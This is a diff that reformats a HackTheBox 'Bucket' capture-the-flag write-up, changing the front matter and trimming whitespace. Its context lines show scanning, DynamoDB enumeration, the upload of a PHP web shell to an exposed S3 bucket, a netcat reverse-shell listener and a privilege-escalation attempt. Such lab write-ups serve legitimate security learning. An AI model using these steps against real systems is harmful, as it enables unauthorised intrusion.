@@ -1,7 +1,6 @@
----
-layout: post
-title: HackTheBox Write-up &mdash; Bucket
----
++++
+title = "HackTheBox Write-up&mdash;Bucket"
++++
 
 This machine is a Linux machine on IP `10.10.10.212`.
 
@@ -16,7 +15,7 @@ Host is up (0.24s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
 |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
 |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
@@ -24,7 +23,7 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 |_http-title: Did not follow redirect to http://bucket.htb/
 Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
- 
+
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 48.61 seconds
 ```
@@ -46,8 +45,8 @@ Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2021-03-03 09:17:45 GMT
  -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
 Initiating SYN Stealth Scan
 Scanning 1 hosts [65535 ports/host]
-Discovered open port 80/tcp on 10.10.10.212                                    
-Discovered open port 22/tcp on 10.10.10.212     
+Discovered open port 80/tcp on 10.10.10.212
+Discovered open port 22/tcp on 10.10.10.212
 ```
 ```bash
 $ mkdir nmap && touch full.nmap && sudo nmap -sC -sV -O -p- -oA nmap/full 10.10.10.212 && cat full.nmap            1 ⨯
@@ -61,7 +60,7 @@ Host is up (0.23s latency).
 Not shown: 65533 closed ports
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |    f7:e8:20:1e:f6:bf:de:ae (RSA)
 |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
 |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
@@ -132,7 +131,7 @@ http://s3.bucket.htb/adserver/images/
 Though I can't seem to get to this website (via `ping` nor browser).
 
 
-After a bit of searching, I found a tool to check what subdomains there might be with a given site.  This tool is called `gobuster`.  
+After a bit of searching, I found a tool to check what subdomains there might be with a given site.  This tool is called `gobuster`.
 
 I first tried it with the initial site:
 ```bash
@@ -209,12 +208,12 @@ I search "AWS S3 DynamoDB" and find a lot of information on "S3 Buckets", etc.  
 To use the AWS CLI, we need to [configure ourselves](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/configure/index.html).  Then we can enumerate the DynamoDB enpoints.  We can use a made-up access key here.
 
 ```bash
-$ aws configure      
+$ aws configure
 AWS Access Key ID [None]: ct
 AWS Secret Access Key [None]: secretkey
-Default region name [None]: 
+Default region name [None]:
 Default output format [None]: text
-                                                                                                                                          
+
 $ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb # read the docs to learn more about enumeration with AWS!
 TABLENAMES      users
 
@@ -280,9 +279,9 @@ system('id');
 We want to upload this file to the AWS server, so we use the CLI:
 ```bash
 $ aws --endpoint-url http://s3.bucket.htb/ s3 cp shell.php s3://adserver/shell.php
-upload: ./shell.php to s3://adserver/shell.php                   
-                                                                                                                                          
-$ aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver/       
+upload: ./shell.php to s3://adserver/shell.php
+
+$ aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver/
                            PRE images/
 2021-03-06 22:31:02       5344 index.html
 2021-03-06 22:31:37         39 rce.php
@@ -328,8 +327,8 @@ $ nc -nlvp 1234                                                                 
 listening on [any] 1234 ...
 connect to [10.10.14.239] from (UNKNOWN) [10.10.10.212] 44336
 /bin/sh: 0: can't access tty; job control turned off
-$ python3 -c 'import pty; pty.spawn("/bin/bash")'           
-www-data@bucket:/var/www/html$ 
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@bucket:/var/www/html$
 ```
 
 Now we just play around, trying to find anything.  In Passage, they had user data, but we already have that!  So we just have a look at what we can find.
@@ -414,7 +413,7 @@ roy@bucket:/var/www/html$ cd /tmp && gdbus call --system --dest com.ubuntu.USBCr
 Error: GDBus.Error:org.freedesktop.DBus.Error.ServiceUnknown: The name com.ubuntu.USBCreator was not provided by any .service files
 ```
 
-No luck.  After being naïve, I recall that this hack worked because we had an `ssh` port open.  We do have this port open here, though this doesn't seem to work.  No worries.  
+No luck.  After being naïve, I recall that this hack worked because we had an `ssh` port open.  We do have this port open here, though this doesn't seem to work.  No worries.
 
 We note that Roy doesn't actually have an `.ssh` directory in his `home`.  So perhaps `ssh` is not the vulnerability here.
 
